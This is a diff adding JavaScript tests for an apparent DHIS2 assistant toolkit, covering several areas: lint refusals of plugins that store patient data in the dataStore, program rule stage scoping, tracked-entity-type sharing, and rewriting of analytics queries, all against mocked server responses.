+    truthy('REFUSED: a Capture enrollment widget writing a dataStore key (shorthand resource)', refusedPd(lintAs({ 'plugin.jsx': "const A = ({ enrollmentId }) => null; const resource = `dataStore/${D2_APP_CONFIG.namespace}/active`; engine.mutate({ resource, type: 'update', data: { enrollmentId } });" }, 'plugin', 'CAPTURE')));
+    truthy('REFUSED: an app that reads tracker events and writes the dataStore', refusedPd(lintAs({ 'app.jsx': "const Q = { ev: { resource: 'tracker/events', params: { fields: 'event' } } }; const M = { resource: 'dataStore/ai-x/cache', type: 'create', data: ({ d }) => d };" }, 'app', null)));
+    truthy('REFUSED: a dashboard plugin reading line-list analytics and writing userDataStore', refusedPd(lintAs({ 'plugin.jsx': "const Q = { r: { resource: 'analytics/events/query/abcdefghijk' } }; engine.mutate({ resource: 'userDataStore/ns/k', type: 'update', data: rows });" }, 'plugin', 'DASHBOARD')));
+    truthy('allowed: a Capture plugin that only READS settings from the dataStore', !refusedPd(lintAs({ 'plugin.jsx': "const A = ({ enrollmentId }) => null; const S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:settings' } } };" }, 'plugin', 'CAPTURE')));
+    truthy('allowed: app.jsx of an app_and_plugin writing settings for its Capture plugin', !refusedPd(lintAs({ 'app.jsx': "engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/settings`, type: 'update', data: s });", 'plugin.jsx': "const A = ({ enrollmentId }) => null;" }, 'app_and_plugin', 'CAPTURE')));
+    truthy('allowed: a dashboard plugin saving per-item settings (aggregate analytics only)', !refusedPd(lintAs({ 'plugin.jsx': "const Q = { a: { resource: 'analytics', params: {} } }; engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${dashboardItemId}`, type: saved ? 'update' : 'create', data: settings });" }, 'plugin', 'DASHBOARD')));
+    truthy('allowed: a Capture plugin writing TRACKER data (not the dataStore)', !refusedPd(lintAs({ 'plugin.jsx': "const A = ({ values, setFieldValue }) => null; engine.mutate({ resource: 'tracker', type: 'create', params: { async: false }, data: { events: [] } });" }, 'plugin', 'CAPTURE')));
+  } else bad('runtime kit could not be loaded for the lint checks');
+  // …and the chatbot's own raw writes.
+  const d2 = ctx.__dhis2();
+  const savedTurn = { t: d2.turnCounter, p: d2.patientDataReadTurn };
+  truthy('dhis2_query dataStore write with tracker record fields is refused', /tracker record data \("enrollmentId"\)/.test(ctx.dataStorePatientDataReason({ active: { enrollmentId: 'abc', at: 'x' } }) || ''));
+  truthy('…nested values / events too', !!ctx.dataStorePatientDataReason(JSON.stringify({ x: { events: [{ dataValues: [] }] } })));
+  d2.turnCounter = 7; d2.patientDataReadTurn = 6;
+  truthy('a plain settings write is allowed', ctx.dataStorePatientDataReason({ columns: ['a'], showTotals: true }) === null);
+  d2.patientDataReadTurn = 7;
+  truthy('…but not in a turn that already read patient data', /already read patient-level data/.test(ctx.dataStorePatientDataReason({ columns: ['a'] }) || ''));
+  d2.turnCounter = savedTurn.t; d2.patientDataReadTurn = savedTurn.p;
+  const savedApps = ctx.listInstalledApps;
+  ctx.listInstalledApps = async () => [{ key: 'ai-owner', activities: { dhis: { namespace: 'ai-owner' } } }];
+  try {
+    const spec = { namespace: 'ai-me' };
+    eq('a hard-coded namespace nobody reserves is reported (const + concatenation)', await ctx.customAppUnreservedNamespaces("const NAMESPACE = 'ai-mch-flags'; const Q = { s: { resource: 'dataStore/' + NAMESPACE } };", spec), ['ai-mch-flags']);
+    eq('…and as a template / literal path', (await ctx.customAppUnreservedNamespaces("const NS = 'shared-x'; const a = `dataStore/${NS}/k`; const b = 'dataStore/other/k';", spec)).sort(), ['other', 'shared-x']);
+    eq('the app\'s own namespace, D2_APP_CONFIG.namespace and another app\'s reserved one are fine', await ctx.customAppUnreservedNamespaces("const a = `dataStore/${D2_APP_CONFIG.namespace}`; const b = 'dataStore/ai-owner/k'; const c = 'dataStore/ai-me';", spec), []);
+  } finally { ctx.listInstalledApps = savedApps; }
+  const dd = ctx.__dhis2();
+  const savedUsed = dd.toolsUsedThisThread;
+  dd.toolsUsedThisThread = ['manage_custom_app'];
+  const followUp = await ctx.buildSystemPrompt('I am hitting flag but nothing is happening');
+  dd.toolsUsedThisThread = [];
+  const unrelated = await ctx.buildSystemPrompt('I am hitting flag but nothing is happening');
+  dd.toolsUsedThisThread = savedUsed;
+  truthy('a bug report in a thread that built a plugin gets the diagnose-first + cooperating-plugins routing', /does nothing" \/ "is not saved": diagnose with real reads first/.test(followUp) && /shared-data contract first/.test(followUp));
+  truthy('…a thread that never built one does not', !/shared-data contract first/.test(unrelated));
+  const manual = vm.runInContext('KB_CUSTOM_APPS_DETAILS', ctx);
+  truthy('manual: cooperating plugins design the contract first and keep record data in tracker data', /### Plugins that work together/.test(manual) && /TRACKER DATA/.test(manual) && /PATIENT DATA NEVER GOES INTO THE DATASTORE/.test(manual) && /Never a shared "current record" pointer/.test(manual));
+  truthy('manual: verified form-field facts (no id in fieldsMetadata, Capture address params, HIDEFIELD blanks values, save is not a server write)', /there is NO id/.test(manual) && /enrollmentEventEdit\?eventId=/.test(manual) && /BLANKS the value/.test(manual) && /needs_write_access is about engine\.mutate/.test(manual));
+  truthy('manual: diagnose before changing code, and "placed" is not "working"', /### When a plugin "does nothing"/.test(manual) && /"Placed and configured" is not "working"/.test(manual));
+}
+
+async function runRuleScopeAndTetSharingChecks() {
+  console.log('\nRule stage scope, duplicate rules across stages & tracked-entity-type data sharing:');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const stageDes = new Map([['stageScreen1', new Set(['deSystolic1', 'deDiastol01', 'deSmoker001', 'deCigs00001'])], ['stageFollow1', new Set(['deSystolic1', 'deDiastol01', 'deHbA1c0001'])]]);
+  const act = (type, de, stage, extra = {}) => ({ programRuleActionType: type, ...(de ? { dataElement: { id: de } } : {}), ...(stage ? { programStage: { id: stage } } : {}), ...extra });
+  eq('every field action naming one stage scopes the rule to it', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('ASSIGN', 'deHbA1c0001', 'stageFollow1')], stageDes), 'stageFollow1');
+  eq('…two different stages stay program-wide', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('HIDEFIELD', 'deCigs00001', 'stageScreen1')], stageDes), null);
+  eq('…an action without a stage keeps the rule program-wide', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('SHOWERROR', 'deDiastol01')], stageDes), null);
+  eq('…an attribute target keeps it program-wide', ctx.inferRuleStageScope([act('HIDEFIELD', null, 'stageFollow1', { trackedEntityAttribute: { id: 'teaNatId0001' } })], stageDes), null);
+  eq('…HIDEPROGRAMSTAGE (the stage is the TARGET) is never a scope', ctx.inferRuleStageScope([act('HIDEPROGRAMSTAGE', null, 'stageFollow1')], stageDes), null);
+  eq('…a data element that is not in the named stage is not scoped', ctx.inferRuleStageScope([act('HIDEFIELD', 'deCigs00001', 'stageFollow1')], stageDes), null);
+  // The NCD case (2026-10-28): a screening and a follow-up copy of one warning on
+  // a data element both stages share, each with its own CURRENT_EVENT variables.
+  const v = (name, de) => ({ name, source_type: 'DATAELEMENT_CURRENT_EVENT', data_element_id: de, value_type: 'INTEGER_POSITIVE' });
+  const copy = (suffix, stage) => ({
+    name: `Crisis warning ${suffix}`,
+    condition: `d2:hasValue(#{sys_${suffix}}) && #{sys_${suffix}} >= 180`,
+    variables: [v(`sys_${suffix}`, 'deSystolic1')],
+    actions: [{ type: 'SHOWWARNING', data_element_id: 'deSystolic1', content: 'Hypertensive crisis', ...(stage ? { program_stage_id: stage } : {}) }],
+  });
+  const scoped = [copy('screening', 'stageScreen1'), copy('followup', 'stageFollow1')];
+  eq('per-stage copies that each name their stage are not duplicates', ctx.lintRuleVisibilitySemantics(scoped, [], { canonVar: ctx.buildPrvCanonicalizer([], scoped) }), []);
+  const unscoped = [copy('screening'), copy('followup')];
+  truthy('unscoped copies whose variables read the same data element ARE duplicates', /"Crisis warning screening" duplicates rule "Crisis warning followup"/.test(ctx.lintRuleVisibilitySemantics(unscoped, [], { canonVar: ctx.buildPrvCanonicalizer([], unscoped) }).join(' ')));
+  const existing = [{ id: 'ruleOld0001', name: 'Old crisis', condition: 'd2:hasValue(#{bp_sys}) && #{bp_sys} >= 180', programRuleActions: [{ programRuleActionType: 'SHOWWARNING', content: 'Hypertensive crisis', dataElement: { id: 'deSystolic1' } }] }];
+  const prvs = [{ name: 'bp_sys', programRuleVariableSourceType: 'DATAELEMENT_CURRENT_EVENT', dataElement: { id: 'deSystolic1' } }];
+  truthy('…also against an existing rule on the program (server shape)', ctx.lintRuleVisibilitySemantics([copy('screening')], existing, { canonVar: ctx.buildPrvCanonicalizer(prvs, [copy('screening')]) }).length === 1);
+  eq('…but not against an existing rule scoped to another stage', ctx.lintRuleVisibilitySemantics([copy('screening', 'stageScreen1')], [{ ...existing[0], programStage: { id: 'stageFollow1' } }], { canonVar: ctx.buildPrvCanonicalizer(prvs, [copy('screening')]) }), []);
+  eq('…a different message on the same field is not a duplicate', ctx.lintRuleVisibilitySemantics([copy('screening'), { ...copy('followup'), actions: [{ type: 'SHOWWARNING', data_element_id: 'deSystolic1', content: 'Recheck in 5 minutes' }] }], [], { canonVar: ctx.buildPrvCanonicalizer([], unscoped) }), []);
+  eq('a NEWEST_EVENT_PROGRAM variable is not the same source as a CURRENT_EVENT one', ctx.lintRuleVisibilitySemantics(unscoped, [], { canonVar: ctx.buildPrvCanonicalizer([], [copy('screening'), { ...copy('followup'), variables: [{ ...v('sys_followup', 'deSystolic1'), source_type: 'DATAELEMENT_NEWEST_EVENT_PROGRAM' }] }]) }), []);
+  // Tracked entity type data sharing.
+  eq('addDataBits adds data bits only', [ctx.addDataBits('rw------', 'rwrw----'), ctx.addDataBits('r-r-----', 'r-rw----'), ctx.addDataBits('rwrw----', 'r-r-----'), ctx.addDataBits('--------', 'r-rw----')], ['rwrw----', 'r-rw----', 'rwrw----', 'r-rw----']);
+  const saved = { sdf: ctx.safeDhis2Fetch, bk: ctx.ensureBackupOrBail };
+  const puts = [];
+  let tetPublic = 'rw------';
+  ctx.ensureBackupOrBail = async () => ({ ok: true, block: { backup_key: 'bk' } });
+  ctx.safeDhis2Fetch = async (p, o = {}) => {
+    if (o.method === 'PUT') { puts.push({ p, body: o.body }); return { status: 'OK' }; }
+    if (/^programs\/progNcd0001\?fields=programType/.test(p)) return { programType: 'WITH_REGISTRATION', trackedEntityType: { id: 'tetPerson01', displayName: 'person' } };
+    if (p === 'sharing?type=program&id=progNcd0001') return { object: { publicAccess: 'rwrw----', userGroupAccesses: [{ id: 'grpNurses01', access: 'r-rw----' }], userAccesses: [] } };
+    if (p === 'sharing?type=trackedEntityType&id=tetPerson01') return { object: { publicAccess: tetPublic, userGroupAccesses: [{ id: 'grpViewer01', access: 'r-r-----' }], userAccesses: [] } };
+    if (/^programs\?filter=trackedEntityType/.test(p)) return { programs: [{ displayName: 'A' }, { displayName: 'B' }] };
+    return { _error: `unexpected ${p}` };
+  };
+  try {
+    const r = await ctx.cascadeProgramDataSharingToTrackedEntityType('progNcd0001', {});
+    const body = puts[0] && puts[0].body.object;
+    truthy('a program shared for data capture gives its tracked entity type the same data access', r && r.updated && body && body.publicAccess === 'rwrw----');
+    eq('…groups with data access on the program are added; existing grants are kept', body && body.userGroupAccesses.map((g) => `${g.id}:${g.access}`).sort(), ['grpNurses01:r-rw----', 'grpViewer01:r-r-----']);
+    truthy('…and the result says how many other programs share the type', r && r.other_programs_using_it === 2 && /shared by 2 other program/.test(r._note));
+    puts.length = 0; tetPublic = 'rwrw----';
+    ctx.safeDhis2Fetch = ((inner) => async (p, o = {}) => (p === 'sharing?type=trackedEntityType&id=tetPerson01'
+      ? { object: { publicAccess: 'rwrw----', userGroupAccesses: [{ id: 'grpNurses01', access: 'rwrw----' }], userAccesses: [] } } : inner(p, o)))(ctx.safeDhis2Fetch);
+    const r2 = await ctx.cascadeProgramDataSharingToTrackedEntityType('progNcd0001', {});
+    truthy('…a type that already grants it is left alone (no write, no backup)', r2 === null && puts.length === 0);
+  } finally { ctx.safeDhis2Fetch = saved.sdf; ctx.ensureBackupOrBail = saved.bk; }
+  // "unique" on a reused attribute; stage names only unique where the server says so.
+  {
+    const saved2 = { sdf: ctx.safeDhis2Fetch, bk: ctx.ensureBackupOrBail };
+    const writes = [];
+    ctx.ensureBackupOrBail = async () => ({ ok: true, block: { backup_key: 'bk' } });
+    ctx.safeDhis2Fetch = async (p, o = {}) => {
+      if (o.method) { writes.push(`${o.method} ${p} ${JSON.stringify(o.body)}`); return {}; }
+      if (/^trackedEntityAttributes\?filter=id:in:/.test(p)) return { trackedEntityAttributes: [{ id: 'teaNatId0001', displayName: 'National ID', unique: false }, { id: 'teaShared001', displayName: 'Passport', unique: false }, { id: 'teaAlready01', displayName: 'Epid', unique: true }] };
+      if (/trackedEntityAttribute\.id:eq:teaShared001/.test(p) && p.startsWith('programs')) return { programs: [{ displayName: 'Other program' }] };
+      if (p.startsWith('programs?') || p.startsWith('trackedEntityTypes?')) return { programs: [], trackedEntityTypes: [] };
+      if (p.startsWith('schemas/programStage')) return { properties: [{ name: 'name', unique: false }] };
+      return { _error: `unexpected ${p}` };
+    };
+    try {
+      const u = await ctx.applyRequestedAttributeUniqueness('progNcd0001', [{ id: 'teaNatId0001' }, { id: 'teaShared001' }, { id: 'teaAlready01' }], {});
+      eq('a reused attribute nobody else uses is made unique; one shared with another program is reported, not changed', [u.applied.map((x) => x.attribute), u.not_applied.map((x) => `${x.attribute}: ${x.shared_with}`), writes], [['National ID'], ['Passport: program "Other program"'], ['PATCH trackedEntityAttributes/teaNatId0001 {"unique":true}']]);
+      vm.runInContext('_stageNameUniqueCache = null', ctx);
+      eq('programStage names are not renamed where the server schema says name is not unique', await ctx.programStageNamesMustBeUnique(), false);
+      vm.runInContext('_stageNameUniqueCache = null', ctx);
+      ctx.safeDhis2Fetch = async () => ({ _error: 'HTTP 500' });
+      eq('…and are still de-duplicated when the schema cannot be read', await ctx.programStageNamesMustBeUnique(), true);
+    } finally { ctx.safeDhis2Fetch = saved2.sdf; ctx.ensureBackupOrBail = saved2.bk; vm.runInContext('_stageNameUniqueCache = null', ctx); }
+  }
+  // create_program's embedded rules: in-form variables read the CURRENT event.
+  {
+    const saved3 = { sdf: ctx.safeDhis2Fetch, pmp: ctx.postMetadataPayload };
+    let posted = null;
+    ctx.safeDhis2Fetch = async (p, o = {}) => {
+      if (o.method) return { status: 'OK' };
+      if (/^schemas\/programStage/.test(p)) return { properties: [{ name: 'name', unique: false }] };
+      if (/^trackedEntityTypes/.test(p)) return { trackedEntityTypes: [{ id: 'tetPerson01', name: 'person', displayName: 'person' }], id: 'tetPerson01', name: 'person' };
+      if (/^trackedEntityAttributes\?filter=name:in:/.test(p) && /Verify%20sex/.test(p)) return { trackedEntityAttributes: [{ id: 'teaSexExist', name: 'Verify sex', valueType: 'TEXT', optionSet: { options: [{ name: 'Male' }, { name: 'Female' }] } }] };
+      const m = p.match(/^(\w+)/);
+      return { [m ? m[1] : 'x']: [], pager: { total: 0 } };
+    };
+    ctx.postMetadataPayload = async (payload) => { posted = payload; return { success: false, phase: 'validate', _error: 'mock: stop after building' }; };
+    try {
+      vm.runInContext('_stageNameUniqueCache = null', ctx);
+      await ctx.createFullProgram({
+        program_name: 'Verify BP', org_unit_ids: ['ouRoot00001'], program_type: 'WITH_REGISTRATION', tracked_entity_type_id: 'tetPerson01',
+        program_attributes: [{ name: 'Verify name', value_type: 'TEXT' }, { name: 'Verify sex', value_type: 'TEXT', option_set: { name: 'Verify sex set', options: ['Male', 'Female'] } }],
+        stages: [
+          { name: 'Screening', data_elements: [{ name: 'Verify systolic', value_type: 'INTEGER_POSITIVE' }, { name: 'Verify diagnosis', value_type: 'TEXT', option_set: { name: 'Verify dx', options: ['HTN', 'DM'] } }] },
+          { name: 'Follow-up', repeatable: true, data_elements: [{ name: 'Verify systolic', value_type: 'INTEGER_POSITIVE' }, { name: 'Verify hba1c', value_type: 'NUMBER' }] },
+        ],
+        program_rules: [
+          { name: 'Crisis', condition: '#{verify_systolic} >= 180', actions: [{ type: 'SHOWWARNING', data_element_name: 'Verify systolic', content: 'Crisis' }] },
+          { name: 'Hide hba1c', condition: "#{verify_diagnosis} == 'HTN'", actions: [{ type: 'HIDEFIELD', data_element_name: 'Verify hba1c' }] },
+          { name: 'Low at follow-up', condition: '#{verify_systolic} < 90', actions: [{ type: 'SHOWWARNING', data_element_name: 'Verify systolic', content: 'Low', program_stage_name: 'Follow-up' }] },
+        ],
+      }, 'bjDvmb4bfuf', null);
+      const src = Object.fromEntries(((posted && posted.programRuleVariables) || []).map((x) => [x.name, x.programRuleVariableSourceType]));
+      eq('create_program: a variable the rule acts on in the same stage reads the CURRENT event; a cross-stage lookup reads the newest event', [src.verify_systolic, src.verify_diagnosis], ['DATAELEMENT_CURRENT_EVENT', 'DATAELEMENT_NEWEST_EVENT_PROGRAM']);
+      eq('create_program: the inline option set of a REUSED attribute is not created (no orphan); the new data element\'s set is', [((posted && posted.optionSets) || []).map((o) => o.name), ((posted && posted.trackedEntityAttributes) || []).map((t) => t.name), ((posted && posted.options) || []).length], [['Verify dx'], ['Verify name'], 2]);
+      const fu = ((posted && posted.programStages) || []).find((x) => x.name === 'Follow-up');
+      eq('create_program: a rule whose actions all name one stage is scoped to it; the others run everywhere; stage names are kept', [((posted && posted.programRules) || []).map((r) => (r.programStage ? r.programStage.id === (fu && fu.id) : null)), ((posted && posted.programStages) || []).map((x) => x.name)], [[null, null, true], ['Screening', 'Follow-up']]);
+    } finally { ctx.safeDhis2Fetch = saved3.sdf; ctx.postMetadataPayload = saved3.pmp; vm.runInContext('_stageNameUniqueCache = null', ctx); }
+  }
+  // audit: a NEWEST_EVENT_PROGRAM variable used in the same (repeatable) form.
+  {
+    const saved4 = ctx.safeDhis2Fetch;
+    const prv = (src) => ({ id: 'prvSys00001', name: 'sys', programRuleVariableSourceType: src, dataElement: { id: 'deSystolic1' } });
+    let vars = [prv('DATAELEMENT_NEWEST_EVENT_PROGRAM')];
+    ctx.safeDhis2Fetch = async (p) => {
+      if (p.startsWith('programRules?')) return { programRules: [{ id: 'ruleCrisis1', name: 'Crisis', condition: 'd2:hasValue(#{sys}) && #{sys} >= 180', programRuleActions: [{ id: 'actCrisis01', programRuleActionType: 'SHOWWARNING', content: 'Crisis', dataElement: { id: 'deSystolic1' } }] }], pager: { pageCount: 1 } };
+      if (p.startsWith('programRuleVariables?')) return { programRuleVariables: vars, pager: { pageCount: 1 } };
+      if (p.startsWith('programs/progNcd0001')) return { id: 'progNcd0001', programStages: [{ id: 'stageScreen1', repeatable: false, programStageDataElements: [{ dataElement: { id: 'deSystolic1' } }] }, { id: 'stageFollow1', repeatable: true, programStageDataElements: [{ dataElement: { id: 'deSystolic1' } }] }], programTrackedEntityAttributes: [] };
+      return { _error: `unexpected ${p}` };
+    };
+    try {
+      const a = await ctx.executeTool('manage_program_rules', { action: 'audit', program_id: 'progNcd0001', deep: false });
+      truthy('audit flags a NEWEST_EVENT_PROGRAM variable read in the same repeatable form, with the PATCH that fixes it', JSON.stringify(a).includes('reads the NEWEST event of the whole enrollment') && JSON.stringify(a).includes('programRuleVariables/prvSys00001'));
+      vars = [prv('DATAELEMENT_CURRENT_EVENT')];
+      const b = await ctx.executeTool('manage_program_rules', { action: 'audit', program_id: 'progNcd0001', deep: false });
+      truthy('…and not a CURRENT_EVENT one', !JSON.stringify(b).includes('reads the NEWEST event'));
+    } finally { ctx.safeDhis2Fetch = saved4; }
+  }
+  // search_metadata paging: never a "page" filter; say when the list is cut off.
+  {
+    const saved5 = ctx.safeDhis2Fetch;
+    const seen = [];
+    ctx.safeDhis2Fetch = async (p) => { seen.push(p); return { trackedEntityAttributes: [{ id: 'a' }, { id: 'b' }], pager: { page: /page=2/.test(p) ? 2 : 1, pageCount: 3, total: 6 } }; };
+    try {
+      const r = await ctx.executeTool('search_metadata', { object_type: 'trackedEntityAttributes', page_size: 2, filters: ['page:eq:2', 'valueType:eq:TEXT'] });
+      eq('search_metadata: a "page:eq:N" filter becomes the page parameter (no 400 "Unknown path property")', seen[0], 'trackedEntityAttributes?fields=id,displayName,code,description&pageSize=2&page=2&filter=valueType:eq:TEXT');
+      truthy('…and a cut-off list says how to get the next page', /Showing 2 of 6 \(page 2 of 3\)\. Next: the same call with page: 3/.test(r._more || ''));
+    } finally { ctx.safeDhis2Fetch = saved5; }
+  }
+  // A two-option Yes/No set is the BOOLEAN type; rules in the same call follow.
+  {
+    const args = {
+      stages: [{ name: 'Follow-up', data_elements: [
+        { name: 'BP controlled', value_type: 'TEXT', option_set: { name: 'NCD Yes/No', options: ['Yes', 'No'] } },
+        { name: 'Referred', value_type: 'TEXT', option_set: { name: 'YNU', options: ['Yes', 'No', 'Unknown'] } },
+        { name: 'Kept', value_type: 'TEXT', keep_option_set: true, option_set: { name: 'YN', options: ['Yes', 'No'] } },
+      ] }],
+      program_rules: [
+        { name: 'a', condition: "#{bp_controlled} == 'YES' && #{referred} == 'YES'", actions: [{ type: 'ASSIGN', data_element_name: 'BP controlled', data: 'd2:condition("#{sys} < 140", \'YES\', \'NO\')' }] },
+        { name: 'b', condition: "#{bp_controlled} == 'No'", actions: [{ type: 'SHOWWARNING', data_element_name: 'BP controlled', content: 'Uncontrolled' }] },
+      ],
+    };
+    eq('a Yes/No option set becomes BOOLEAN (a Yes/No/Unknown set and keep_option_set stay)', [ctx.healYesNoOptionSets(args), args.stages[0].data_elements.map((d) => `${d.value_type}${d.option_set ? '+OS' : ''}`)], [['BP controlled'], ['BOOLEAN', 'TEXT+OS', 'TEXT+OS']]);
+    eq('…and the rules of the same call compare / assign booleans', [args.program_rules[0].condition, args.program_rules[0].actions[0].data, args.program_rules[1].condition], ["#{bp_controlled} == true && #{referred} == 'YES'", 'd2:condition("#{sys} < 140", true, false)', '(!d2:hasValue(#{bp_controlled}) || #{bp_controlled} != true)']);
+  }
+  // Multi-root instances: one root picked by the model is not "the whole hierarchy".
+  {
+    const saved6 = { sdf: ctx.safeDhis2Fetch, base: ctx.__dhis2().baseUrl };
+    const probes = [];
+    ctx.__dhis2().baseUrl = 'http://verify.local';
+    vm.runInContext('_userRootOuCache = null; lastUserText = "Build charts across the whole hierarchy"; conversationHistory = [];', ctx);
+    ctx.safeDhis2Fetch = async (p) => {
+      if (p.startsWith('me?fields=organisationUnits')) return { organisationUnits: [{ id: 'rootPalest1', displayName: 'Palestine', level: 1 }, { id: 'rootEgypt01', displayName: 'MoHP Egypt', level: 1 }] };
+      if (p.startsWith('analytics/')) { probes.push(p); return /ou:USER_ORGUNIT/.test(p) ? { headers: [], rows: [[1], [2]], metaData: { pager: { total: 40 } } } : { headers: [], rows: [], metaData: { pager: { total: 0 } } }; }
+      return { _error: `unexpected ${p}` };
+    };
+    try {
+      const r = await ctx.singleRootScopeRefusal(['rootEgypt01'], 'Visualization "x"');
+      truthy('one of several top org units, never named by the user, is refused with USER_ORGUNIT as the fix', r && /never asked for "MoHP Egypt"/.test(r._error) && /USER_ORGUNIT/.test(r._hint));
+      eq('…USER_ORGUNIT, a level, several units, or a root the user named pass', [await ctx.singleRootScopeRefusal(['USER_ORGUNIT'], 'x'), await ctx.singleRootScopeRefusal(['rootEgypt01', 'LEVEL-4'], 'x'), await ctx.singleRootScopeRefusal(['rootEgypt01', 'rootPalest1'], 'x')], [null, null, null]);
+      vm.runInContext('lastUserText = "a chart for MoHP Egypt only"', ctx);
+      eq('…and so does a root the user asked for by name', await ctx.singleRootScopeRefusal(['rootEgypt01'], 'x'), null);
+      const w = await ctx.lineListEmptyWarning('analytics/enrollments/query/progNcd0001?dimension=ou:rootEgypt01&dimension=pe:LAST_12_MONTHS');
+      truthy('an empty line list re-checks across USER_ORGUNIT and says the data lives elsewhere (not "run analytics")', /returns 40 row\(s\)/.test(w) && /Analytics tables are fine/.test(w) && probes.some((p) => /dimension=ou:USER_ORGUNIT&/.test(p)));
+      const prompt = await ctx.buildSystemPrompt('make a chart');
+      truthy('the system prompt names every top org unit and says the whole hierarchy is USER_ORGUNIT', /Your top org units: Palestine \(rootPalest1\), MoHP Egypt \(rootEgypt01\) — 2 separate hierarchies/.test(prompt));
+    } finally {
+      ctx.safeDhis2Fetch = saved6.sdf; ctx.__dhis2().baseUrl = saved6.base;
+      vm.runInContext('_userRootOuCache = null; lastUserText = ""; conversationHistory = [];', ctx);
+    }
+  }
+  truthy('analytics: a multi-period keyword as a dimension is labelled "no total row", and a mixed yearly row is not that total', /NO total row for LAST_12_MONTHS\. The THIS_YEAR row\(s\) cover a different range/.test(ctx.analyticsPeriodRowsNote('analytics?dimension=dx:abc&dimension=pe:THIS_YEAR;LAST_12_MONTHS&dimension=ou:USER_ORGUNIT') || ''));
+  eq('…a filter=pe or a single period gets no note', [ctx.analyticsPeriodRowsNote('analytics?dimension=dx:abc&filter=pe:LAST_12_MONTHS'), ctx.analyticsPeriodRowsNote('analytics?dimension=pe:THIS_YEAR&dimension=dx:abc')], [null, null]);
+  {
+    const saved7 = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programIndicators?filter=id:in:') ? { programIndicators: (p.match(/in:\[([^\]]+)\]/)[1].split(',')).filter((x) => x.startsWith('pi')).map((id) => ({ id })) } : { _error: 'unexpected' });
+    try {
+      eq('program indicators asked for on an enrollment AGGREGATE endpoint are routed to /analytics (no 409 E7224)', await ctx.routeProgramIndicatorAnalytics('analytics/enrollments/aggregate/progNcd0001?dimension=ou%3AUSER_ORGUNIT&dimension=pe%3ALAST_12_MONTHS&dimension=dx%3Api000000001%3Bpi000000002&pageSize=50&stage=stageFollow1'), { path: 'analytics?dimension=dx%3Api000000001%3Bpi000000002&dimension=ou%3AUSER_ORGUNIT&dimension=pe%3ALAST_12_MONTHS', routed: true });
+      eq('…also bare / single program-indicator dimensions (no dx:), which otherwise group by the indicator value', (await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&dimension=pe:THIS_YEAR&dimension=pi000000001&dimension=pi000000002;pi000000003&stage=stageFollow1')).path, 'analytics?dimension=dx%3Api000000001%3Bpi000000002%3Bpi000000003&dimension=ou:USER_ORGUNIT&dimension=pe:THIS_YEAR');
+      eq('…keeping startDate / endDate when the query has no pe dimension', (await ctx.routeProgramIndicatorAnalytics('analytics/enrollments/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT;LEVEL-4&dimension=pi000000001&startDate=2025-11-01&endDate=2026-10-31')).path, 'analytics?dimension=dx%3Api000000001&dimension=ou:USER_ORGUNIT;LEVEL-4&startDate=2025-11-01&endDate=2026-10-31');
+      eq('…data elements are not routed (they stay event/enrollment dimensions)', (await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=dx:deSystolic1&dimension=pe:LAST_12_MONTHS')).routed, false);
+    } finally { ctx.safeDhis2Fetch = saved7; }
+    eq('…dimension=stage:<uid> becomes the stage parameter', ctx.healEventAnalyticsDxDimension('analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&dimension=stage:stageFoll01&startDate=2025-01-01').path, 'analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&stage=stageFoll01&startDate=2025-01-01');
+    eq('several items under one dx: on an event endpoint become one dimension each', ctx.healEventAnalyticsDxDimension('analytics/events/query/progNcd0001?dimension=dx:deSystolic1;deDiastol01&dimension=pe:LAST_12_MONTHS').path, 'analytics/events/query/progNcd0001?dimension=deSystolic1&dimension=deDiastol01&dimension=pe:LAST_12_MONTHS');
+  }
+  {
+    const b = ctx.buildVisualizationObject({ name: 'q', vis_type: 'COLUMN', data_items: ['piVisits001'], periods: ['QUARTERS_THIS_YEAR', 'QUARTERS_LAST_YEAR'], org_units: ['USER_ORGUNIT'] }, { piVisits001: 'PROGRAM_INDICATOR' });
+    eq('"this year and last year" periods are saved chronologically (last year first) with explicit axis items', b.viz.rows && b.viz.rows[0].items.map((i) => i.id), ['QUARTERS_LAST_YEAR', 'QUARTERS_THIS_YEAR']);
+    const c = ctx.buildVisualizationObject({ name: 'q', vis_type: 'LINE', data_items: ['piVisits001'], periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] }, { piVisits001: 'PROGRAM_INDICATOR' });
+    eq('…other period sets keep the flag-only payload', c.viz.rows, undefined);
+  }
+  {
+    const lintDates = (code) => ctx.lintCustomAppCode({ 'plugin.jsx': code }, 'plugin', null, 'CAPTURE').errors.some((e) => /Tracker timestamps/.test(e.message));
+    const bug = "const Q = { ev: { resource: 'tracker/events', params: { fields: 'event,occurredAt' } } };\nfunction daysSince(dateStr) { const d = new Date(dateStr + 'T00:00:00'); return d; }\nconst n = daysSince(latest.occurredAt);";
+    const trackerLint = (code) => ctx.lintCustomAppCode({ 'app.jsx': code }, 'app', null).errors.map((e) => e.message).join(' | ');
+    const pagedBad = "const Q = { r: { resource: 'tracker/events', params: { page: 1, pageSize: 100, fields: 'event,orgUnit[id,displayName]' } } };\nconst n = res.r.pager.pageCount;";
+    truthy('custom-app lint: tracker paging on pager.pageCount without totalPages, and orgUnit[…] on tracker records, are refused', /no pager\.pageCount/.test(trackerLint(pagedBad)) && /orgUnit as a plain UID string/.test(trackerLint(pagedBad)));
